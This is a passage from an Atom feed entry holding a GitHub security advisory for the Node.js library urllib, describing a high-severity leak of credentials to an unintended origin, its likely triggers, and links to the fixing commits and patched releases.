<p>This exposes credentials to an origin that was not the intended recipient. Depending on the credential type and server-side validation, the leaked credentials may be reusable against the original partner API or related services.</p>
<p>This requires no user interaction. Realistic triggers include compromised partner subdomains, DNS hijacking, malicious partner endpoints during onboarding, internal services redirecting across trust boundaries, or an open redirect upstream of urllib's call site.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/node-modules/urllib/security/advisories/GHSA-hq3h-g68c-hp78">https://github.com/node-modules/urllib/security/advisories/GHSA-hq3h-g68c-hp78</a></li>
<li><a href="https://github.com/node-modules/urllib/pull/812">https://github.com/node-modules/urllib/pull/812</a></li>
<li><a href="https://github.com/node-modules/urllib/pull/813">https://github.com/node-modules/urllib/pull/813</a></li>
<li><a href="https://github.com/node-modules/urllib/commit/7c86c465883ebd3dea5109c87d7bbe3b00960a16">https://github.com/node-modules/urllib/commit/7c86c465883ebd3dea5109c87d7bbe3b00960a16</a></li>
<li><a href="https://github.com/node-modules/urllib/commit/811a8d56e64e540bf6a19bf8b3737692f05d5c46">https://github.com/node-modules/urllib/commit/811a8d56e64e540bf6a19bf8b3737692f05d5c46</a></li>
<li><a href="https://github.com/node-modules/urllib/releases/tag/v2.44.1">https://github.com/node-modules/urllib/releases/tag/v2.44.1</a></li>
<li><a href="https://github.com/node-modules/urllib/releases/tag/v4.9.1">https://github.com/node-modules/urllib/releases/tag/v4.9.1</a></li>
<li><a href="https://github.com/advisories/GHSA-hq3h-g68c-hp78">https://github.com/advisories/GHSA-hq3h-g68c-hp78</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hq3h-g68c-hp78</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-25T16:19:32.000Z</published>
    </entry>
</feed>